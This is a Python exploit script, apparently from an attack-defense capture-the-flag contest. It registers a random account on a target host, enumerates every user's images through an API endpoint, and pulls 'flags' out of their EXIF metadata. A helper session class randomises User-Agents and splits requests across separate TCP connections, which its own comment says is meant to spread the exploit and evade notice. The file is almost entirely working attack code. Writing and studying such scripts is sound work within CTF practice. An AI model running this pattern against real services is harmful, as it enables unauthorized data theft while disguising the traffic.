import os
import requests
import json
import string
import random
import sys
import re
from exif import Image

""" <config> """
PORT = 8080
# DEBUG -- logs to stderr, TRACE -- log HTTP requests
DEBUG = os.getenv("DEBUG", False)
TRACE = os.getenv("TRACE", False)
""" </config> """


class FakeSession(requests.Session):
    """
    FakeSession reference:
        - `s = FakeSession(host, PORT)` -- creation
        - `s` mimics all standard request.Session API except of fe features:
            -- `url` can be started from "/path" and will be expanded to "http://{host}:{PORT}/path"
            -- for non-HTTP scheme use "https://{host}/path" template which will be expanded in the same manner
            -- `s` uses random browser-like User-Agents for every requests
            -- `s` closes connection after every request, so exploit get splitted among multiple TCP sessions
    Short requests reference:
        - `s.post(url, data={"arg": "value"})`          -- send request argument
        - `s.post(url, headers={"X-Boroda": "DA!"})`    -- send additional headers
        - `s.post(url, auth=(login, password)`          -- send basic http auth
        - `s.post(url, timeout=1.1)`                    -- send timeouted request
        - `s.request("CAT", url, data={"eat":"mice"})`  -- send custom-verb request
        (response data)
        - `r.text`/`r.json()`  -- text data // parsed json object
    """

    USER_AGENTS = [
        """Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15""",
        """Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36""",
        """Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201""",
        """Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2.13; ) Gecko/20101203""",
        """Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0""",
    ]

    def __init__(self, host, port):
        super(FakeSession, self).__init__()
        if port:
            self.host_port = "{}:{}".format(host, port)
        else:
            self.host_port = host

    def prepare_request(self, request):
        r = super(FakeSession, self).prepare_request(request)
        r.headers["User-Agent"] = random.choice(FakeSession.USER_AGENTS)
        r.headers["Connection"] = "close"
        return r

    # fmt: off
    def request(self, method, url,
                params=None, data=None, headers=None,
                cookies=None, files=None, auth=None, timeout=None, allow_redirects=True,
                proxies=None, hooks=None, stream=None, verify=None, cert=None, json=None,
                ):
        if url[0] == "/" and url[1] != "/":
            url = "http://" + self.host_port + url
        else:
            url = url.format(host=self.host_port)
        r = super(FakeSession, self).request(
            method, url, params, data, headers, cookies, files, auth, timeout,
            allow_redirects, proxies, hooks, stream, verify, cert, json,
        )
        if TRACE:
            print("[TRACE] {method} {url} {r.status_code}".format(**locals()))
        return r
    # fmt: on


def _register(s, username, realname, password):
    data = json.dumps({
        "username": username,
        "realname": realname,
        "password": password
    })

    r = s.post("/api/users", data=data)

    token = r.json()["access_token"]
    return token


def _get_images(s):
    r = s.get(f"/api/images")
    return r.json()


def _download(s, url):
    r = s.get(f"{url}", allow_redirects=True)

    name = f"{rand_string()}.jpg"
    open(name, 'wb').write(r.content)

    with open(name, 'rb') as image_file:
        img = Image(image_file)
        flag = img.artist
    os.remove(name)
    return flag


def rand_string(len=12):
    alphabet = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(len))


def exploit(host):
    s = FakeSession(host, PORT)
    username = rand_string()
    password = rand_string()
    realname = rand_string()
    token = _register(s, username, realname, password)
    s.headers = {"Authorization": f"Bearer {token}"}
    imgs = _get_images(s)
    flags = []

    for img in imgs:
        url = img["url"]
        flag = _download(s, url)
        flags.append(flag)

    return flags


def main():
    flags = exploit(sys.argv[1])
    print(flags, flush=True)


if __name__ == "__main__":
    main()
